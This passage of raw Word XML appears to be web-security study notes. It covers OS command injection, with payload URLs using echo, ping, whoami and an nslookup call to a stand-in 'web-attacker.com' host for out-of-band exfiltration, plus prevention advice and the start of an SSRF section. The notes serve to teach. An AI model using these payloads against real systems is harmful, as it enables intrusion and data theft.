    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t># Passing `echo hello` to the shell</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># If this appears in the response, the command injection is successful</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>https://insecure-website.com/stockStatus?productID=%26%20echo%20h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ello%20%26</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># Blind injection - using timing to determine if the command was successful</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># `&amp; ping -c 10 127.0.0.1 &amp;` will take 10 seconds to complete</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>https://insecure-website.com/stockStatus?productID=%26%20ping%20-c%2010%20127.0.0.1%20%26</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># Blind injecti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>on - writing to a file in the web root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"># `&amp; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>whoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt; /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>/www/static/whoami.txt &amp;` and then fetch with https://vulnerable-website.com/whoami.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>https://vulnerable-website.com/stockStatus?productID=%26%20whoami%20%3E%20%2Fvar%2Fwww%2Fstatic%2Fwhoami.txt%20</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>%26</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># Blind injection - DNS query to a malicious DNS server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"># `&amp; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>nslookup</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> kgji2ohoyw.web-attacker.com &amp;` and then check query logs.  DNS can also be used to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>exfiltrate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> data.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>https://vulnerable-website.com/stockStatus?productID=%26%20nslookup%20kgji2ohoyw.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>web-attacker.com%20%26</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Injected commands usually end with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to prevent subsequent commands from stopping the injected command from running.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Injection characters</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">The following can all be </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>uesd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> to inject commands:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&amp;&amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>|</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>||</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Newline (0x0a or \n)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># Bash spe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>cific</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>$(</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Do not allow user input to be used in any shell commands.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If there's no other option, validate user input against a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>safelist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> of allowed characters or commands.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Tools</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId35" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp Proxy</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId36" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp Repeater</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId37" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>BApp</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> Store &gt; </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Hackvertor</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:sectPr w:rsidR="00B3581B">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:pgNumType w:start="1"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/os-command-injection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Cross-origin resource sharing (CORS</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>) :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>knot:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Tools</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:sectPr w:rsidR="00B3581B">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:pgNumType w:start="1"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Referenc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>es</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Server-side request forgery (SSRF</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>) :</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>fountain_pen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Cause a server to make requests to </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>an</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>unintented</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> location.  This can be an internal or external server and can result in:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>information leakage;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>account compromise; or</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>an</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> attack that appears to come from t</w:t>
      </w:r>
      <w:r>
        <w:t>he compromised server.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>SSRF attacks rely on exploiting trust, generally between an app and backend systems.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Common attacks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>SSRF against self</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Attacker causes the server to request itself via </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>localhost</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>127.0.0.1</w:t>
      </w:r>
      <w:r>
        <w:t>.  This may bypass access controls since the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> request is coming from the server.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t># Request for product stock</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>POST /product/stock HTTP/1.0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Content-Type: application/x-www-form-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>urlencoded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Content-Length: 118</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># Change to request for the `/admin` page via localhost</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>POST /product/stock HTTP/1.0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Content-Type: application/x-www-form-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
